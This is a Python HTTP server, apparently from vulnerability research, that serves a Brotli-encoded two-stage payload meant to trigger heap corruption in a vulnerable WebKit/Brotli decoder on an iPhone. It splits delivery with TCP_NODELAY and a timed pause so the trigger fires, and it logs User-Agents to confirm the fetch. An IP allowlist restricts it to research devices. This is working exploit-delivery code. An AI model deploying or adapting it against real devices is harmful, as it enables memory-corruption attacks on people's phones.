#!/usr/bin/env python3
"""Tiny HTTP server that serves Brotli-encoded bodies and logs who asked.

  /brtest  -> the Brotli body (reachability probe or the trigger payload)

Only requests from ALLOWED_FROM are served.  The research devices are the only
hosts allowed to fetch a payload; everything else on the network (including the
iPhone 6s+, which is explicitly off limits) is refused.

Every request is logged with its User-Agent, so we can tell whether the
WebKit networking process (distinctive UA) really fetched it.

The connection is aborted right after the body is written: the vulnerable
Brotli decoder turns the payload into unbounded output, and we do not want the
decoding daemon buffering gigabytes.  The heap corruption has already happened
by the time the body is fully delivered.
"""
import http.server
import os
import socket
import sys
import time

ALLOWED_FROM = ("198.51.100.1", "127.0.0.1")   # the 13 Pro (and local tests)
PAYLOADS = {}
PAGE_PATH = "/private/tmp/scanpage.html"
SPLIT1 = "/private/tmp/stage1.bin"
SPLIT2 = os.environ.get("SPLIT2", "/private/tmp/stage2.bin")
SPLIT_DELAY = float(os.environ.get("SPLIT_DELAY", "0.3"))
POST_DELAY = float(os.environ.get("POST_DELAY", "0.8"))
SPLIT_OK = os.environ.get("NOSPLIT") != "1"


class H(http.server.BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"

    def log_message(self, fmt, *args):
        ua = self.headers.get("User-Agent", "?")
        print("REQ %s %s ua=%r" % (self.command, self.path, ua), flush=True)

    def do_GET(self):
        src = self.client_address[0]
        if src not in ALLOWED_FROM:
            print("REFUSED %s from %s (not in %s)" % (self.path, src, ALLOWED_FROM), flush=True)
            self.send_response(403)
            self.send_header("Content-Length", "0")
            self.end_headers()
            return
        path = self.path.split("?")[0]
        if path == "/page":
            try:
                with open(PAGE_PATH, "rb") as f:
                    html = f.read()
            except OSError:
                html = b"<h1>no page</h1>"
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("Cache-Control", "no-store")
            self.send_header("Content-Length", str(len(html)))
            self.end_headers()
            try:
                self.wfile.write(html)
                self.wfile.flush()
            except Exception as e:
                print("write failed:", e, flush=True)
            return
        # The Brotli trigger only fires when the 127-byte second stage arrives
        # as a *fresh decoder input*, i.e. after the decoder has drained stage 1
        # and parked.  Over HTTP both stages otherwise coalesce into one stream
        # and decode cleanly.  So: NODELAY + a pause between the two parts.
        parts = None
        if path == "/brtest" and SPLIT_OK:
            try:
                with open(SPLIT1, "rb") as f: p1 = f.read()
                with open(SPLIT2, "rb") as f: p2 = f.read()
                parts = (p1, p2)
            except OSError:
                parts = None
        body = PAYLOADS.get(path)
        if parts is not None:
            body = None
        if body is None and parts is None:
            self.send_response(404)
            self.send_header("Content-Length", "0")
            self.end_headers()
            return
        total = len(parts[0]) + len(parts[1]) if parts else len(body)
        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.send_header("Content-Encoding", "br")
        self.send_header("Content-Length", str(total))
        self.end_headers()
        try:
            try:
                self.connection.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            except Exception:
                pass
            if parts:
                self.wfile.write(parts[0]); self.wfile.flush()
                time.sleep(SPLIT_DELAY)
                self.wfile.write(parts[1]); self.wfile.flush(); time.sleep(POST_DELAY)
            else:
                self.wfile.write(body)
                self.wfile.flush()
        except Exception as e:
            print("write failed:", e, flush=True)
        try:
            self.connection.shutdown(socket.SHUT_WR)
        except Exception:
            pass
        self.close_connection = True

    def do_HEAD(self):
        self.do_GET()


def main():
    for name in sys.argv[1:]:
        try:
            with open(name, "rb") as f:
                key = "/" + os.path.basename(name).split(".")[0]
                PAYLOADS[key] = f.read()
            print("serving %s (%d bytes) to %s only" % (key, len(PAYLOADS[key]), ALLOWED_FROM), flush=True)
        except Exception as e:
            print("skip", name, e, flush=True)
    srv = http.server.ThreadingHTTPServer(("0.0.0.0", 8777), H)
    print("listening on 8777 (allowlist %s)" % (ALLOWED_FROM,), flush=True)
    srv.serve_forever()


main()
